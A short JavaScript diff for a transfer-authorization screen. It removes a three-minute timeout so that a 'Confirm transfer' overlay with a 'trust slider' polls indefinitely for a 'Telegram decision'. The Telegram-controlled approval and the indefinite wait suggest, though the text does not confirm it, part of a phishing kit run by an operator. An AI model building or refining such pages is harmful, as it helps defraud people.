@@ -652,6 +652,7 @@
 
   /* ============================================================
      Authorizing overlay + polling
+     — Waits indefinitely until Telegram decision (no auto-timeout)
   ============================================================ */
   let pollingActive = false;
   let pollTimer = null;
@@ -731,21 +732,9 @@
     startTrustSlider();
 
     pollingActive = true;
-    const start = Date.now();
-    const maxWaitMs = 3 * 60 * 1000;
 
     const poll = async () => {
       if (!pollingActive) return;
-
-      if (Date.now() - start > maxWaitMs) {
-        pollingActive = false;
-        stopTrustSlider();
-        document.getElementById('authorizingOverlay').classList.remove('show');
-        btn.disabled = false;
-        btn.textContent = 'Confirm transfer';
-        showToast('Verification timed out. Please try again.');
-        return;
-      }
 
       let decision = 'pending';
       try {
